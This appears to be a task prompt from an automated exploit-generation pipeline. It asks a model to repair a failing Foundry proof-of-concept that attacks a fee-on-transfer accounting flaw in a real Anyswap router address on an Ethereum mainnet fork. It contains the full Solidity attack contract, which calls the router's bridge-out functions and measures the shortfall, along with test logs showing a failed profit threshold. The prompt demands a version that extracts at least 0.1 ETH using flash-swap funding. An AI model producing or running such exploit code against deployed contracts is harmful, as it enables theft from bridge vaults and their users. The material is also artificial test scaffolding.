You are fixing a failing Foundry PoC for finding F-005.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Underlying bridge-out flows use the requested amount instead of the amount actually received
- claim: All `Underlying` bridge and trade entrypoints transfer a nominal `amount` of the underlying into the anyToken contract and then immediately call `depositVault(amount, ...)` and burn/bridge the same nominal amount, without measuring how many units actually arrived. Fee-on-transfer, rebasing, or otherwise non-standard underlyings can therefore leave the vault underfunded while the router still bridges the full amount.
- impact: Users can be credited on the destination chain for more value than was actually locked on the source chain, creating undercollateralized wrapped supply and eventual redemption shortfalls. The inverse user-facing effect is also possible: users may pay transfer fees on the source chain but still have the full nominal amount burned/bridged, overcharging them and pushing losses onto vault backing.
- exploit_paths: ["`anySwapOutUnderlying` transfers `amount`, then calls `depositVault(amount)` and `_anySwapOut(..., amount, ...)`", "`anySwapOutUnderlyingWithPermit` and `anySwapOutUnderlyingWithTransferPermit` repeat the same nominal-amount accounting", "`anySwapOutExactTokensForTokensUnderlying*` transfer underlying to `path[0]`, then deposit and burn the full `amountIn`", "`anySwapOutExactTokensForNativeUnderlying*` transfer underlying to `path[0]`, then deposit and burn the full `amountIn`"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IAnyswapV1ERC20 {
    function underlying() external view returns (address);
}

interface IAnyswapV4Router {
    function anySwapOutUnderlying(address token, address to, uint256 amount, uint256 toChainId) external;
    function anySwapOutExactTokensForTokensUnderlying(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline,
        uint256 toChainId
    ) external;
    function anySwapOutExactTokensForNativeUnderlying(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline,
        uint256 toChainId
    ) external;
    function mpc() external view returns (address);
}

contract FlawVerifier {
    address public constant TARGET = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;

    string internal constant PATH_UNDERLYING = "anySwapOutUnderlying: transfer underlying -> depositVault(amount) -> burn/bridge nominal amount";
    string internal constant PATH_UNDERLYING_PERMIT = "anySwapOutUnderlyingWithPermit: same nominal accounting, but requires an off-chain permit signature";
    string internal constant PATH_UNDERLYING_TRANSFER_PERMIT = "anySwapOutUnderlyingWithTransferPermit: same nominal accounting, but requires an off-chain transferWithPermit signature";
    string internal constant PATH_TOKENS_UNDERLYING = "anySwapOutExactTokensForTokensUnderlying*: transfer underlying to path[0] -> depositVault(amountIn) -> burn nominal amountIn";
    string internal constant PATH_NATIVE_UNDERLYING = "anySwapOutExactTokensForNativeUnderlying*: transfer underlying to path[0] -> depositVault(amountIn) -> burn nominal amountIn";

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;

    bool public directUnderlyingPathAttempted;
    bool public tokensUnderlyingPathAttempted;
    bool public nativeUnderlyingPathAttempted;
    bool public permitPathInfeasible;
    bool public transferPermitPathInfeasible;
    bool public destinationSettlementInfeasible;
    bool public missingCandidateConfiguration;
    bool public missingDirectUnderlyingBalance;
    bool public missingTradeUnderlyingBalance;
    bool public noFeeObserved;

    uint256 public nominalAmountTried;
    uint256 public actualReceivedOnDirectPath;
    uint256 public actualReceivedOnTokensPath;
    uint256 public actualReceivedOnNativePath;

    address public configuredAnyToken;
    address public configuredUnderlying;
    address public configuredReceiver;
    uint256 public configuredAmount;
    uint256 public configuredToChainId;
    uint256 public configuredDeadline;

    address[] private _tokensPath;
    address[] private _nativePath;

    string public pathUsed;
    string public failureReason;
    string public lastRouterRevert;

    constructor() {
        _profitToken = address(0);
        configuredReceiver = address(this);
        configuredToChainId = 56;
        configuredDeadline = type(uint256).max;
    }

    function configure(
        address anyToken,
        uint256 amount,
        uint256 toChainId,
        uint256 deadline,
        address receiver,
        address[] calldata configuredTokensPath,
        address[] calldata configuredNativePath
    ) external {
        configuredAnyToken = anyToken;
        configuredUnderlying = anyToken == address(0) ? address(0) : IAnyswapV1ERC20(anyToken).underlying();
        configuredAmount = amount;
        configuredToChainId = toChainId;
        configuredDeadline = deadline;
        configuredReceiver = receiver == address(0) ? address(this) : receiver;

        delete _tokensPath;
        for (uint256 i = 0; i < configuredTokensPath.length; i++) {
            _tokensPath.push(configuredTokensPath[i]);
        }

        delete _nativePath;
        for (uint256 i = 0; i < configuredNativePath.length; i++) {
            _nativePath.push(configuredNativePath[i]);
        }
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        _profitToken = address(0);
        _profitAmount = 0;
        hypothesisValidated = false;
        pathUsed = "";
        failureReason = "";
        lastRouterRevert = "";

        // The router bug exists entirely on the source chain, but the value transfer that would monetize it is not.
        // Every profitable completion of the reported hypothesis needs an MPC-controlled anySwapIn mint/release on a
        // destination chain. On this harness, we are constrained to one Ethereum mainnet fork at block 14037236.
        // The affected source-side functions below can burn and emit bridge events, but they do not transfer any
        // already-existing mainnet asset back to the attacker on this chain.
        destinationSettlementInfeasible = IAnyswapV4Router(TARGET).mpc() != address(0);

        // Permit variants are path-equivalent accounting bugs, but mechanically require an externally signed permit.
        // The verifier is a freshly deployed contract with a zero-argument constructor, no EOA key, and no prank/mock
        // privileges, so the permit-bearing entrypoints cannot be executed honestly inside this harness.
        permitPathInfeasible = true;
        transferPermitPathInfeasible = true;

        if (configuredAnyToken == address(0) || configuredUnderlying == address(0) || configuredAmount == 0) {
            missingCandidateConfiguration = true;
            failureReason = string.concat(
                "missing configured anyToken/underlying/amount. Required precondition for ",
                PATH_UNDERLYING,
                "; permit variants also remain infeasible: ",
                PATH_UNDERLYING_PERMIT,
                " ; ",
                PATH_UNDERLYING_TRANSFER_PERMIT
            );
            pathUsed = "no executable path on this fork without a concrete anyToken whose underlying transfers less than nominal";
            return;
        }

        nominalAmountTried = configuredAmount;

        bool directSucceeded = _attemptDirectUnderlyingPath();
        bool tokensSucceeded = _attemptTokensUnderlyingPath();
        bool nativeSucceeded = _attemptNativeUnderlyingPath();

        if (directSucceeded || tokensSucceeded || nativeSucceeded) {
            uint256 maxShortfall = _max3(
                _shortfall(configuredAmount, actualReceivedOnDirectPath),
                _shortfall(configuredAmount, actualReceivedOnTokensPath),
                _shortfall(configuredAmount, actualReceivedOnNativePath)
            );

            if (maxShortfall > 0) {
                hypothesisValidated = true;
            } else {
                noFeeObserved = true;
            }
        }

        if (hypothesisValidated) {
            pathUsed = string.concat(
                PATH_UNDERLYING,
                " | ",
                PATH_TOKENS_UNDERLYING,
                " | ",
                PATH_NATIVE_UNDERLYING,
                ". Accounting mismatch reproduced, but same-chain profit remains blocked because settlement requires destination MPC action."
            );
            failureReason = "accounting bug reproduced; monetization unavailable on a single source-chain fork without destination-chain MPC settlement";
            return;
        }

        if (bytes(lastRouterRevert).length != 0) {
            failureReason = lastRouterRevert;
        } else if (missingDirectUnderlyingBalance || missingTradeUnderlyingBalance) {
            failureReason = "verifier held no pre-existing underlying balance for the direct_or_existing_balance_first strategy";
        } else if (noFeeObserved) {
            failureReason = "configured underlying transferred the full nominal amount on this fork, so the reported shortfall did not materialize";
        } else {
            failureReason = "configured path did not yield a measurable received-vs-requested shortfall before destination settlement";
        }

        pathUsed = string.concat(
            PATH_UNDERLYING,
            " | ",
            PATH_TOKENS_UNDERLYING,
            " | ",
            PATH_NATIVE_UNDERLYING,
            ". Permit variants documented as mechanically infeasible in this harness."
        );
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function tokensPath() external view returns (address[] memory) {
        return _copyPath(_tokensPath);
    }

    function nativePath() external view returns (address[] memory) {
        return _copyPath(_nativePath);
    }

    function _attemptDirectUnderlyingPath() internal returns (bool) {
        directUnderlyingPathAttempted = true;

        uint256 balance = IERC20(configuredUnderlying).balanceOf(address(this));
        if (balance < configuredAmount) {
            missingDirectUnderlyingBalance = true;
            return false;
        }

        _forceApprove(configuredUnderlying, TARGET, configuredAmount);

        uint256 beforeBalance = IERC20(configuredUnderlying).balanceOf(configuredAnyToken);
        (bool success, bytes memory returndata) = TARGET.call(
            abi.encodeWithSelector(
                IAnyswapV4Router.anySwapOutUnderlying.selector,
                configuredAnyToken,
                configuredReceiver,
                configuredAmount,
                configuredToChainId
            )
        );
        if (!success) {
            lastRouterRevert = _decodeRevert(returndata);
            return false;
        }

        uint256 afterBalance = IERC20(configuredUnderlying).balanceOf(configuredAnyToken);
        actualReceivedOnDirectPath = afterBalance - beforeBalance;
        return true;
    }

    function _attemptTokensUnderlyingPath() internal returns (bool) {
        tokensUnderlyingPathAttempted = true;

        if (_tokensPath.length < 2 || _tokensPath[0] != configuredAnyToken) {
            return false;
        }

        uint256 balance = IERC20(configuredUnderlying).balanceOf(address(this));
        if (balance < configuredAmount) {
            missingTradeUnderlyingBalance = true;
            return false;
        }

        _forceApprove(configuredUnderlying, TARGET, configuredAmount);

        uint256 beforeBalance = IERC20(configuredUnderlying).balanceOf(configuredAnyToken);
        address[] memory path = _copyPath(_tokensPath);
        (bool success, bytes memory returndata) = TARGET.call(
            abi.encodeWithSelector(
                IAnyswapV4Router.anySwapOutExactTokensForTokensUnderlying.selector,
                configuredAmount,
                uint256(0),
                path,
                configuredReceiver,
                configuredDeadline,
                configuredToChainId
            )
        );
        if (!success) {
            lastRouterRevert = _decodeRevert(returndata);
            return false;
        }

        uint256 afterBalance = IERC20(configuredUnderlying).balanceOf(configuredAnyToken);
        actualReceivedOnTokensPath = afterBalance - beforeBalance;
        return true;
    }

    function _attemptNativeUnderlyingPath() internal returns (bool) {
        nativeUnderlyingPathAttempted = true;

        if (_nativePath.length < 2 || _nativePath[0] != configuredAnyToken) {
            return false;
        }

        uint256 balance = IERC20(configuredUnderlying).balanceOf(address(this));
        if (balance < configuredAmount) {
            missingTradeUnderlyingBalance = true;
            return false;
        }

        _forceApprove(configuredUnderlying, TARGET, configuredAmount);

        uint256 beforeBalance = IERC20(configuredUnderlying).balanceOf(configuredAnyToken);
        address[] memory path = _copyPath(_nativePath);
        (bool success, bytes memory returndata) = TARGET.call(
            abi.encodeWithSelector(
                IAnyswapV4Router.anySwapOutExactTokensForNativeUnderlying.selector,
                configuredAmount,
                uint256(0),
                path,
                configuredReceiver,
                configuredDeadline,
                configuredToChainId
            )
        );
        if (!success) {
            lastRouterRevert = _decodeRevert(returndata);
            return false;
        }

        uint256 afterBalance = IERC20(configuredUnderlying).balanceOf(configuredAnyToken);
        actualReceivedOnNativePath = afterBalance - beforeBalance;
        return true;
    }

    function _copyPath(address[] storage stored) internal view returns (address[] memory out) {
        out = new address[](stored.length);
        for (uint256 i = 0; i < stored.length; i++) {
            out[i] = stored[i];
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        require(ok0 && (data0.length == 0 || abi.decode(data0, (bool))), "approve-zero-failed");
        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok1 && (data1.length == 0 || abi.decode(data1, (bool))), "approve-amount-failed");
    }

    function _shortfall(uint256 nominal, uint256 actualReceived) internal pure returns (uint256) {
        if (actualReceived >= nominal) {
            return 0;
        }
        return nominal - actualReceived;
    }

    function _max3(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        uint256 m = a > b ? a : b;
        return m > c ? m : c;
    }

    function _decodeRevert(bytes memory returndata) internal pure returns (string memory) {
        bytes4 selector;
        if (returndata.length >= 4) {
            assembly {
                selector := mload(add(returndata, 0x20))
            }
        }
        if (returndata.length >= 68 && selector == 0x08c379a0) {
            assembly {
                returndata := add(returndata, 0x04)
            }
            return abi.decode(returndata, (string));
        }
        return "router-call-reverted-without-string";
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 12.78s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 509643)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [509643] FlawVerifierTest::testExploit()
    ├─ [2415] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [484123] FlawVerifier::executeOnOpportunity()
    │   ├─ [4618] 0x6b7a87899490EcE95443e979cA9485CBE7E71522::mpc() [staticcall]
    │   │   └─ ← [Return] 0x2A038e100F8B85DF21e4d44121bdBfE0c288A869
    │   └─ ← [Stop]
    ├─ [415] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.46s (388.17ms CPU time)

Ran 1 test suite in 1.56s (1.46s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 509643)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
